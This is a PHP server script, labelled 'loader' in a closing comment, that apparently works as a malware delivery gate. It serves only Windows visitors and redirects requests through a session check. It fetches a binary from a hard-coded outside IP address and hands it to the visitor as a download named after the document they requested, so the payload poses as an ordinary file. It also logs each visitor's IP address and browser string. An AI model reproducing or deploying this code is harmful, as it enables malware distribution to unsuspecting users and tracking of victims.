<?php 

	if( session_start() === false ){
		exit('ss.');
	}
	
	$REQUEST_URI = $_SERVER['REQUEST_URI'];

	if( empty($REQUEST_URI) ){
		exit('REQUEST_URI');
	}

	$REQUEST_URI_ARR = explode("/", $REQUEST_URI);

	if( count($REQUEST_URI_ARR) != 3 ){
		exit('REQUEST_URI_ARR');
	}

	$_GET['e'] = $REQUEST_URI_ARR[2];

	if( empty($_SERVER['HTTP_USER_AGENT']) ){
		exit('user.');
	}

	if( stripos($_SERVER['HTTP_USER_AGENT'], 'Windows') === false ){
		exit('w.');
	}

	if( $_GET['e'] != '123.zip' ){

		if( $_GET['e'] != "documents.zip" ){

			$_SESSION['__redirect_was_start'] = true;
			$_SESSION['doc_name'] = $_GET['e'];

			$redirect_uri = str_replace($_GET['e'], "documents.zip", $REQUEST_URI);

			echo '<div id="ll" data-rr="'. $redirect_uri .'"></div>';

			echo "<script>";
			echo "location.pathname = document.getElementById('ll').getAttribute('data-rr');";
			echo "</script>";

			exit('Wait...');
		}else{

			if( empty($_SESSION['__redirect_was_start']) ){
				exit('rws.');
			}

		}

	}

	function getRealIpAddr()
	{
	    if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
	    {
	      $ip=$_SERVER['HTTP_CLIENT_IP'];
	    }
	    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
	    {
	      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
	    }
	    else
	    {
	      $ip=$_SERVER['REMOTE_ADDR'];
	    }
	    return $ip;
	}

	$links = [
		'http://162.241.127.123/router08.php',
		'http://162.241.127.123/router08.php',
		'http://162.241.127.123/router08.php',
	];

	shuffle($links);

	file_put_contents( 
		__DIR__ . '/../try__big__stat.txt',
		date('c') . "\t" . getRealIpAddr() . "\t" . $_SERVER['HTTP_USER_AGENT'] . "\t". $_GET['e'] . "\r\n",
		FILE_APPEND
	);

	$outfilepath = __DIR__ . '/../big__stat.txt';

	foreach ($links as $link) {

		$ctx = stream_context_create(array('http'=>
		    array(
		        'timeout' => 30,
		    )
		));

		$data = file_get_contents( $link , false, $ctx);

		if( strlen($data) < 10000 ){
			continue;
		}

		file_put_contents( 
			$outfilepath,
			date('c') . "\t" . getRealIpAddr() . "\t" . $_SERVER['HTTP_USER_AGENT'] . "\t". $_GET['e'] . "\r\n",
			FILE_APPEND
		);

		header('Content-Description: File Transfer');
		header('Content-Type: application/octet-stream');
		header('Content-Disposition: attachment; filename=' . $_SESSION['doc_name'] ); 
		header('Content-Transfer-Encoding: binary');
		header('Connection: Keep-Alive');
		header('Expires: 0');
		header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
		header('Pragma: public');

		echo $data;

		exit;
	}

	exit("Try again.");

	//<< loader